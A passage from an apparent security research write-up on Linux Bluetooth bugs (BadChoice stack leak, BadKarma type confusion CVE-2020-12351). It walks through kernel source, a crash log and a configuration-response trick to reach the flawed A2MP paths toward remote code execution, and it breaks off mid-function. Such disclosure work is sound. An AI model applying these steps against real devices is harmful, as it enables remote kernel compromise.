<p>I discovered the second vulnerability in the command <code class="language-plaintext highlighter-rouge">A2MP_GETINFO_REQ</code> of the A2MP protocol by going through all <code class="language-plaintext highlighter-rouge">a2mp_send()</code> invocations. The vulnerability has existed since Linux kernel 3.6 and is reachable if <code class="language-plaintext highlighter-rouge">CONFIG_BT_HS=y</code> which used to be enabled by default.</p>

<p>Let’s take a look at the subroutine <code class="language-plaintext highlighter-rouge">a2mp_getinfo_req()</code> invoked by the <code class="language-plaintext highlighter-rouge">A2MP_GETINFO_REQ</code> command:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">a2mp_getinfo_req</span><span class="p">(</span><span class="k">struct</span> <span class="n">amp_mgr</span> <span class="o">*</span><span class="n">mgr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span>
			    <span class="k">struct</span> <span class="n">a2mp_cmd</span> <span class="o">*</span><span class="n">hdr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">a2mp_info_req</span> <span class="o">*</span><span class="n">req</span>  <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">hdev</span> <span class="o">=</span> <span class="n">hci_dev_get</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">hdev</span> <span class="o">||</span> <span class="n">hdev</span><span class="o">-&gt;</span><span class="n">dev_type</span> <span class="o">!=</span> <span class="n">HCI_AMP</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">a2mp_info_rsp</span> <span class="n">rsp</span><span class="p">;</span>

		<span class="n">rsp</span><span class="p">.</span><span class="n">id</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">;</span>
		<span class="n">rsp</span><span class="p">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">A2MP_STATUS_INVALID_CTRL_ID</span><span class="p">;</span>

		<span class="n">a2mp_send</span><span class="p">(</span><span class="n">mgr</span><span class="p">,</span> <span class="n">A2MP_GETINFO_RSP</span><span class="p">,</span> <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">ident</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rsp</span><span class="p">),</span>
			  <span class="o">&amp;</span><span class="n">rsp</span><span class="p">);</span>

		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The subroutine is meant to request information about the AMP controller using the HCI device id. However, if it is invalid or not of the type <code class="language-plaintext highlighter-rouge">HCI_AMP</code>, the error path is taken, meaning that the victim sends us back the status <code class="language-plaintext highlighter-rouge">A2MP_STATUS_INVALID_CTRL_ID</code>. Unfortunately, the <code class="language-plaintext highlighter-rouge">struct a2mp_info_rsp</code> consists of more members than just the id and the status, and as we can see, the response structure is not fully initialized. As a consequence, 16 bytes of kernel stack can be disclosed to the attacker which may contain sensitive data of the victim:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C a2mp_info_rsp --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">a2mp_info_rsp</span> <span class="p">{</span>
	<span class="cm">/* typedef __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span>              <span class="n">id</span><span class="p">;</span>                                <span class="cm">/*     0   0x1 */</span>
	<span class="cm">/* typedef __u8 */</span> <span class="kt">unsigned</span> <span class="kt">char</span>              <span class="n">status</span><span class="p">;</span>                            <span class="cm">/*   0x1   0x1 */</span>
	<span class="cm">/* typedef __le32 -&gt; __u32 */</span> <span class="kt">unsigned</span> <span class="kt">int</span>               <span class="n">total_bw</span><span class="p">;</span>               <span class="cm">/*   0x2   0x4 */</span>
	<span class="cm">/* typedef __le32 -&gt; __u32 */</span> <span class="kt">unsigned</span> <span class="kt">int</span>               <span class="n">max_bw</span><span class="p">;</span>                 <span class="cm">/*   0x6   0x4 */</span>
	<span class="cm">/* typedef __le32 -&gt; __u32 */</span> <span class="kt">unsigned</span> <span class="kt">int</span>               <span class="n">min_latency</span><span class="p">;</span>            <span class="cm">/*   0xa   0x4 */</span>
	<span class="cm">/* typedef __le16 -&gt; __u16 */</span> <span class="kt">short</span> <span class="kt">unsigned</span> <span class="kt">int</span>         <span class="n">pal_cap</span><span class="p">;</span>                <span class="cm">/*   0xe   0x2 */</span>
	<span class="cm">/* typedef __le16 -&gt; __u16 */</span> <span class="kt">short</span> <span class="kt">unsigned</span> <span class="kt">int</span>         <span class="n">assoc_size</span><span class="p">;</span>             <span class="cm">/*  0x10   0x2 */</span>

	<span class="cm">/* size: 18, cachelines: 1, members: 7 */</span>
	<span class="cm">/* last cacheline: 18 bytes */</span>
<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">));</span>
</code></pre></div></div>

<p>Such a vulnerability can be exploited by sending interesting commands to populate the stack frame prior to sending <code class="language-plaintext highlighter-rouge">A2MP_GETINFO_REQ</code>. Here, interesting commands are those that put pointers in the same stack frame that <code class="language-plaintext highlighter-rouge">a2mp_getinfo_req()</code> reuses. By doing so, uninitialized variables may end up containing pointers previously pushed onto the stack.</p>

<p>Note that kernels compiled with <code class="language-plaintext highlighter-rouge">CONFIG_INIT_STACK_ALL_PATTERN=y</code> should not be vulnerable to such attacks. For example, on ChromeOS, <em>BadChoice</em> only returns 0xAA’s. However, this option does not seem to be enabled by default yet on popular Linux distros.</p>

<h3 id="badkarma-heap-based-type-confusion-cve-2020-12351">BadKarma: Heap-Based Type Confusion (CVE-2020-12351)<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#badkarma-heap-based-type-confusion-cve-2020-12351" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>I discovered the third vulnerability while attempting to trigger <em>BadChoice</em> and confirm its exploitability. Namely, the victim’s machine unexpectedly crashed with the following call trace:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[  445.440736] general protection fault: 0000 [#1] SMP PTI
[  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
[  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  445.440764] Workqueue: hci0 hci_rx_work [bluetooth]
[  445.440771] RIP: 0010:sk_filter_trim_cap+0x6d/0x220
[  445.440773] Code: e8 18 e1 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 4c 8b 78 18 48 89 4d b0 &lt;41&gt; f6 47 02 08 0f 85 41 01 00 00 0f 1f 44 00 00 49 8b 47 30 49 8d
[  445.440776] RSP: 0018:ffffa86b403abca0 EFLAGS: 00010286
[  445.440778] RAX: ffffffffc071cc50 RBX: ffff8e95af6d7000 RCX: 0000000000000000
[  445.440780] RDX: 0000000000000000 RSI: ffff8e95ac533800 RDI: ffff8e95af6d7000
[  445.440781] RBP: ffffa86b403abd00 R08: ffff8e95b452f0e0 R09: ffff8e95b34072c0
[  445.440782] R10: ffff8e95acd57818 R11: ffff8e95b456ae38 R12: ffff8e95ac533800
[  445.440784] R13: 0000000000000000 R14: 0000000000000001 R15: 30478b4800000208
[  445.440786] FS:  0000000000000000(0000) GS:ffff8e95b4500000(0000) knlGS:0000000000000000
[  445.440788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  445.440789] CR2: 000055f371aa94a8 CR3: 000000022dc0a005 CR4: 00000000003606e0
[  445.440791] Call Trace:
[  445.440817]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[  445.440838]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[  445.440857]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[  445.440875]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[  445.440878]  ? skb_release_all+0x26/0x30
[  445.440896]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[  445.440914]  hci_rx_work+0x186/0x360 [bluetooth]
[  445.440919]  process_one_work+0x1eb/0x3b0
[  445.440921]  worker_thread+0x4d/0x400
[  445.440924]  kthread+0x104/0x140
[  445.440927]  ? process_one_work+0x3b0/0x3b0
[  445.440929]  ? kthread_park+0x90/0x90
[  445.440932]  ret_from_fork+0x35/0x40
</code></pre></div></div>

<p>Taking a look at <code class="language-plaintext highlighter-rouge">l2cap_data_rcv()</code>, we can see that <code class="language-plaintext highlighter-rouge">sk_filter()</code> is invoked when ERTM (Enhanced Retransmission Mode) or streaming mode is used (similar to TCP):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">l2cap_data_rcv</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="n">chan</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="k">if</span> <span class="p">((</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">==</span> <span class="n">L2CAP_MODE_ERTM</span> <span class="o">||</span>
	     <span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">==</span> <span class="n">L2CAP_MODE_STREAMING</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">sk_filter</span><span class="p">(</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">skb</span><span class="p">))</span>
		<span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This is indeed the case for the A2MP channel (channels can be compared with network ports):</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="nf">a2mp_chan_open</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_conn</span> <span class="o">*</span><span class="n">conn</span><span class="p">,</span> <span class="n">bool</span> <span class="n">locked</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="n">chan</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">err</span><span class="p">;</span>

	<span class="n">chan</span> <span class="o">=</span> <span class="n">l2cap_chan_create</span><span class="p">();</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chan</span><span class="p">)</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">=</span> <span class="n">L2CAP_MODE_ERTM</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="k">return</span> <span class="n">chan</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">...</span>
<span class="k">static</span> <span class="k">struct</span> <span class="n">amp_mgr</span> <span class="o">*</span><span class="nf">amp_mgr_create</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_conn</span> <span class="o">*</span><span class="n">conn</span><span class="p">,</span> <span class="n">bool</span> <span class="n">locked</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">amp_mgr</span> <span class="o">*</span><span class="n">mgr</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="n">chan</span><span class="p">;</span>

	<span class="n">mgr</span> <span class="o">=</span> <span class="n">kzalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">mgr</span><span class="p">),</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">mgr</span><span class="p">)</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">chan</span> <span class="o">=</span> <span class="n">a2mp_chan_open</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">locked</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chan</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">kfree</span><span class="p">(</span><span class="n">mgr</span><span class="p">);</span>
		<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">mgr</span><span class="o">-&gt;</span><span class="n">a2mp_chan</span> <span class="o">=</span> <span class="n">chan</span><span class="p">;</span>
	<span class="n">chan</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">mgr</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="k">return</span> <span class="n">mgr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Looking at <code class="language-plaintext highlighter-rouge">amp_mgr_create()</code>, it is clear where the mistake is. Namely, <code class="language-plaintext highlighter-rouge">chan-&gt;data</code> is of the type <code class="language-plaintext highlighter-rouge">struct amp_mgr</code>, whereas <code class="language-plaintext highlighter-rouge">sk_filter()</code> takes an argument of the type <code class="language-plaintext highlighter-rouge">struct sock</code>, meaning that we have a remote type confusion by design. This confusion was introduced in Linux kernel 4.8 and since then has remained unchanged.</p>

<h2 id="exploitation">Exploitation<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#exploitation" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2>

<p>The <em>BadChoice</em> vulnerability can be chained with <em>BadVibes</em> as well as <em>BadKarma</em> to achieve RCE. In this blogpost, we will only focus on the method using <em>BadKarma</em>, for the following reasons:</p>

<ul>
  <li>It is not limited to Bluetooth 5.</li>
  <li>It does not require the victim to be scanning.</li>
  <li>It is possible to perform a targeted attack on a specific device.</li>
</ul>

<p>The <em>BadVibes</em> attack, on the other hand, is a broadcast only, thus only one machine could be successfully exploited while all other machines listening to the same message would simply crash.</p>

<h3 id="bypassing-badkarma">Bypassing BadKarma<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#bypassing-badkarma" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>Ironically, in order to exploit <em>BadKarma</em>, we must first get rid of <em>BadKarma</em>. Recall that there is a type confusion bug by design, and as long as the A2MP channel is configured as ERTM/streaming mode, we cannot reach the A2MP subroutines via <code class="language-plaintext highlighter-rouge">l2cap_data_rcv()</code> without triggering the panic in <code class="language-plaintext highlighter-rouge">sk_filter()</code>.</p>

<p>Looking at <code class="language-plaintext highlighter-rouge">l2cap_data_channel()</code>, we can see that the only possible way to take a different route is to reconfigure the channel mode to <code class="language-plaintext highlighter-rouge">L2CAP_MODE_BASIC</code>. This would “basically” allow us to invoke the A2MP receive handler directly:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">l2cap_data_channel</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_conn</span> <span class="o">*</span><span class="n">conn</span><span class="p">,</span> <span class="n">u16</span> <span class="n">cid</span><span class="p">,</span>
			       <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="n">chan</span><span class="p">;</span>

	<span class="n">chan</span> <span class="o">=</span> <span class="n">l2cap_get_chan_by_scid</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">cid</span><span class="p">);</span>
	<span class="p">...</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">case</span> <span class="n">L2CAP_MODE_BASIC</span><span class="p">:</span>
		<span class="cm">/* If socket recv buffers overflows we drop data here
		 * which is *bad* because L2CAP has to be reliable.
		 * But we don't have any other choice. L2CAP doesn't
		 * provide flow control mechanism. */</span>

		<span class="k">if</span> <span class="p">(</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">imtu</span> <span class="o">&lt;</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">BT_ERR</span><span class="p">(</span><span class="s">"Dropping L2CAP data: receive buffer overflow"</span><span class="p">);</span>
			<span class="k">goto</span> <span class="n">drop</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">ops</span><span class="o">-&gt;</span><span class="n">recv</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">skb</span><span class="p">))</span>
			<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
		<span class="k">break</span><span class="p">;</span>

	<span class="k">case</span> <span class="n">L2CAP_MODE_ERTM</span><span class="p">:</span>
	<span class="k">case</span> <span class="n">L2CAP_MODE_STREAMING</span><span class="p">:</span>
		<span class="n">l2cap_data_rcv</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
		<span class="k">goto</span> <span class="n">done</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="p">}</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, is the reconfiguration of the channel mode even possible? According to the specification, the use of ERTM or streaming mode is mandatory for the A2MP channel:</p>

<blockquote>
  <p>The Bluetooth Core maintains a level of reliability for protocols and profiles above the Core by mandating the use of Enhanced Retransmission Mode or Streaming Mode for any L2CAP channel used over the AMP.<br>
Source: <a href="https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=421043">https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx?doc_id=421043</a></p>
</blockquote>

<p>For some reason, this fact is not described in the specification and the implementation of Linux actually allows us to switch from any channel mode to <code class="language-plaintext highlighter-rouge">L2CAP_MODE_BASIC</code> by encapsulating the desired channel mode in the <code class="language-plaintext highlighter-rouge">L2CAP_CONF_UNACCEPT</code> configuration response:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c`</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">l2cap_config_rsp</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_conn</span> <span class="o">*</span><span class="n">conn</span><span class="p">,</span>
				   <span class="k">struct</span> <span class="n">l2cap_cmd_hdr</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="n">u16</span> <span class="n">cmd_len</span><span class="p">,</span>
				   <span class="n">u8</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">l2cap_conf_rsp</span> <span class="o">*</span><span class="n">rsp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_conf_rsp</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">scid</span>   <span class="o">=</span> <span class="n">__le16_to_cpu</span><span class="p">(</span><span class="n">rsp</span><span class="o">-&gt;</span><span class="n">scid</span><span class="p">);</span>
	<span class="n">flags</span>  <span class="o">=</span> <span class="n">__le16_to_cpu</span><span class="p">(</span><span class="n">rsp</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>
	<span class="n">result</span> <span class="o">=</span> <span class="n">__le16_to_cpu</span><span class="p">(</span><span class="n">rsp</span><span class="o">-&gt;</span><span class="n">result</span><span class="p">);</span>
	<span class="p">...</span>
	<span class="n">chan</span> <span class="o">=</span> <span class="n">l2cap_get_chan_by_scid</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">scid</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">chan</span><span class="p">)</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">switch</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">case</span> <span class="n">L2CAP_CONF_UNACCEPT</span><span class="p">:</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">num_conf_rsp</span> <span class="o">&lt;=</span> <span class="n">L2CAP_CONF_MAX_CONF_RSP</span><span class="p">)</span> <span class="p">{</span>
			<span class="p">...</span>
			<span class="n">result</span> <span class="o">=</span> <span class="n">L2CAP_CONF_SUCCESS</span><span class="p">;</span>
			<span class="n">len</span> <span class="o">=</span> <span class="n">l2cap_parse_conf_rsp</span><span class="p">(</span><span class="n">chan</span><span class="p">,</span> <span class="n">rsp</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">len</span><span class="p">,</span>
						   <span class="n">req</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">req</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">);</span>
			<span class="p">...</span>
		<span class="p">}</span>
		<span class="n">fallthrough</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="p">}</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This function invokes the subroutine <code class="language-plaintext highlighter-rouge">l2cap_parse_conf_rsp()</code>. There, if the option type <code class="language-plaintext highlighter-rouge">L2CAP_CONF_RFC</code> is specified, and the current channel mode is not <code class="language-plaintext highlighter-rouge">L2CAP_MODE_BASIC</code>, it is possible to change it to our desire:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">l2cap_parse_conf_rsp</span><span class="p">(</span><span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="o">*</span><span class="n">chan</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">rsp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">,</span>
				<span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">u16</span> <span class="o">*</span><span class="n">result</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="k">while</span> <span class="p">(</span><span class="n">len</span> <span class="o">&gt;=</span> <span class="n">L2CAP_CONF_OPT_SIZE</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">len</span> <span class="o">-=</span> <span class="n">l2cap_get_conf_opt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rsp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">type</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">olen</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">len</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
			<span class="k">break</span><span class="p">;</span>

		<span class="k">switch</span> <span class="p">(</span><span class="n">type</span><span class="p">)</span> <span class="p">{</span>
		<span class="p">...</span>
		<span class="k">case</span> <span class="n">L2CAP_CONF_RFC</span><span class="p">:</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">olen</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rfc</span><span class="p">))</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rfc</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">val</span><span class="p">,</span> <span class="n">olen</span><span class="p">);</span>
			<span class="p">...</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">...</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">==</span> <span class="n">L2CAP_MODE_BASIC</span> <span class="o">&amp;&amp;</span> <span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">!=</span> <span class="n">rfc</span><span class="p">.</span><span class="n">mode</span><span class="p">)</span>
		<span class="k">return</span> <span class="o">-</span><span class="n">ECONNREFUSED</span><span class="p">;</span>

	<span class="n">chan</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">=</span> <span class="n">rfc</span><span class="p">.</span><span class="n">mode</span><span class="p">;</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The natural question hereby is whether we first need to receive a configuration request from the victim before we can send back a configuration response? This seems to be a weakness of the protocol – the answer is no. Moreover, whatever the victim negotiates with us, we can send back a <code class="language-plaintext highlighter-rouge">L2CAP_CONF_UNACCEPT</code> response and the victim will happily accept our suggestion.</p>

<p>Using the configuration response bypass, we are now able to reach the A2MP commands and exploit <em>BadChoice</em> to retrieve all the information we need (see later sections). Once we are ready to trigger the type confusion, we can simply recreate the A2MP channel by disconnecting and connecting the channel and as such, set the channel mode back to ERTM as required for <em>BadKarma</em>.</p>

<h3 id="exploring-sk_filter">Exploring sk_filter()<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#exploring-sk_filter" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>As we understand, the issue of <em>BadKarma</em> is that a <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> object is passed to <code class="language-plaintext highlighter-rouge">sk_filter()</code>, whereas a <code class="language-plaintext highlighter-rouge">struct sock</code> object is expected. In other words, fields in <code class="language-plaintext highlighter-rouge">struct sock</code> falsely map to fields in <code class="language-plaintext highlighter-rouge">struct amp_mgr</code>. As a consequence, this could result in dereferencing invalid pointers and ultimately panic. Looking back at the panic log from before, this is exactly what happened and what primarily led to the discovery of <em>BadKarma</em>.</p>

<p>Can we control that pointer dereference, or control other members in <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> in order to affect the code-flow of <code class="language-plaintext highlighter-rouge">sk_filter()</code>? Let’s take a look at <code class="language-plaintext highlighter-rouge">sk_filter()</code> and track the usage of <code class="language-plaintext highlighter-rouge">struct sock *sk</code> to understand what members are relevant in this subroutine.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h</span>
<span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">sk_filter</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">return</span> <span class="n">sk_filter_trim_cap</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c</span>
<span class="kt">int</span> <span class="nf">sk_filter_trim_cap</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cap</span><span class="p">)</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">err</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sk_filter</span> <span class="o">*</span><span class="n">filter</span><span class="p">;</span>

	<span class="cm">/*
	 * If the skb was allocated from pfmemalloc reserves, only
	 * allow SOCK_MEMALLOC sockets to use it as this socket is
	 * helping free memory
	 */</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">skb_pfmemalloc</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">sock_flag</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">SOCK_MEMALLOC</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">NET_INC_STATS</span><span class="p">(</span><span class="n">sock_net</span><span class="p">(</span><span class="n">sk</span><span class="p">),</span> <span class="n">LINUX_MIB_PFMEMALLOCDROP</span><span class="p">);</span>
